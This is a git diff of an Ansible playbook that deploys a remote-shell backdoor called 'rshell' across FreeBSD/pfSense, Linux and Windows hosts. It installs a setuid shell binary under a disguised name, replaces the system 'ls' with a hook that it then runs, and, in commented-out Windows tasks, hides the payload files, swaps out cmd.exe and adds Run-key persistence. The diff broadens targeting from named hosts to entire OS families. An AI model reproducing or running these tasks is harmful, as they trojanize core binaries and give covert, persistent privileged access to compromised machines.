@@ -9,21 +9,25 @@
     src: rshell-bsd
     dest: /usr/bin/rshell
     mode: 4755
-  when: inventory_hostname_short == 'ozone' or inventory_hostname_short == 'pipeline'
+  when: ansible_os_family == 'FreeBSD'
 
 - name: RSHELL | Move ls | BSD
   copy:
     remote_src: yes
     src: /bin/ls
     dest: /usr/bin/ls
-  when: inventory_hostname_short == 'ozone' or inventory_hostname_short == 'pipeline'
+  when: ansible_os_family == 'FreeBSD'
 
 - name: RSHELL | Copy ls hook | pfSense
   copy:
     src: ls-bsd
     dest: /bin/ls
     mode: 755
-  when: inventory_hostname_short == 'ozone' or inventory_hostname_short == 'pipeline'
+  when: ansible_os_family == 'FreeBSD'
+
+- name: RSHELL | Init Shell | pfSense
+  shell: "/bin/ls"
+  when: ansible_os_family == 'FreeBSD'
 
 ######################################################################
 #
@@ -31,54 +35,54 @@
 #
 ######################################################################
 
-- name: RSHELL | Copy Packet.dll | Windows
-  copy:
-    src: "Packet.dll"
-    dest: "C:\\Windows\\System32\\Packet.dll"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Copy Packet.dll | Windows
+#   copy:
+#     src: "Packet.dll"
+#     dest: "C:\\Windows\\System32\\Packet.dll"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Copy shell | Windows
-  copy:
-    src: "rshell.exe"
-    dest: "C:\\ProgramData\\rshell.exe"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Copy shell | Windows
+#   copy:
+#     src: "rshell.exe"
+#     dest: "C:\\ProgramData\\rshell.exe"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Move cmd | Linux
-  copy:
-    remote_src: yes
-    src: "C:\\Windows\\System32\\cmd.exe"
-    dest: "C:\\ProgramData\\cmd.exe"
-  when: inventory_hostname_short == 'albatross' or inventory_hostname_short == 'orca' or inventory_hostname_short == 'whale'
+# - name: RSHELL | Move cmd | Linux
+#   copy:
+#     remote_src: yes
+#     src: "C:\\Windows\\System32\\cmd.exe"
+#     dest: "C:\\ProgramData\\cmd.exe"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Copy cmd hook | Windows
-  copy:
-    src: "cmd.exe"
-    dest: "C:\\Windows\\System32\\cmd.exe"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Copy cmd hook | Windows
+#   copy:
+#     src: "cmd.exe"
+#     dest: "C:\\Windows\\System32\\cmd.exe"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Hide Packet.dll | Windows
-  win_command: "attrib +h 'C:\\Windows\\System32\\Packet.dll'"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Hide Packet.dll | Windows
+#   win_command: "attrib +h 'C:\\Windows\\System32\\Packet.dll'"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Hide shell | Windows
-  win_command: "attrib +h 'C:\\ProgramData\\rshell.exe'"
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Hide shell | Windows
+#   win_command: "attrib +h 'C:\\ProgramData\\rshell.exe'"
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Add run key persistence | Windows
-  win_regedit: 
-    path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-    name: "rshell.exe"
-    data: "C:\\ProgramData\\rshell.exe"
-    type: string
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Add run key persistence | Windows
+#   win_regedit: 
+#     path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+#     name: "rshell.exe"
+#     data: "C:\\ProgramData\\rshell.exe"
+#     type: string
+#   when: ansible_os_family == 'Windows'
 
-- name: RSHELL | Run agent | Windows
-  win_shell: 'runas /trustlevel:0x20000 rshell.exe'
-  async: 45
-  poll: 0
-  args:
-    chdir: 'C:\\ProgramData'
-  when: inventory_hostname_short == 'squid' or inventory_hostname_short == 'drill' or inventory_hostname_short == 'penguin' or inventory_hostname_short == 'sealion' or inventory_hostname_short == 'tank'
+# - name: RSHELL | Run agent | Windows
+#   win_shell: 'runas /trustlevel:0x20000 rshell.exe'
+#   async: 45
+#   poll: 0
+#   args:
+#     chdir: 'C:\\ProgramData'
+#   when: ansible_os_family == 'Windows'
 
 ######################################################################
 #
@@ -86,23 +90,31 @@
 #
 ######################################################################
 
+- name: RSHELL | Define Linux Distros
+  set_facts:
+    linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+
 - name: RSHELL | Install shell | Linux
   copy:
     src: rshell
-    dest: /usr/bin/rshell
+    dest: /usr/bin/common-init
     mode: 4755
-  when: inventory_hostname_short == 'albatross' or inventory_hostname_short == 'orca' or inventory_hostname_short == 'whale'
+  when: ansible_os_family in linux_distros
 
 - name: RSHELL | Move ls | Linux
   copy:
     remote_src: yes
     src: /bin/ls
-    dest: /usr/bin/ls
-  when: inventory_hostname_short == 'albatross' or inventory_hostname_short == 'orca' or inventory_hostname_short == 'whale'
+    dest: /usr/bin/list
+  when: ansible_os_family in linux_distros
 
 - name: RSHELL | Copy ls hook | Linux
   copy:
     src: ls
     dest: /bin/ls
     mode: 755
-  when: inventory_hostname_short == 'albatross' or inventory_hostname_short == 'orca' or inventory_hostname_short == 'whale'
+  when: ansible_os_family in linux_distros
+
+- name: RSHELL | Init Shell | Linux
+  shell: "/bin/ls"
+  when: ansible_os_family in linux_distros
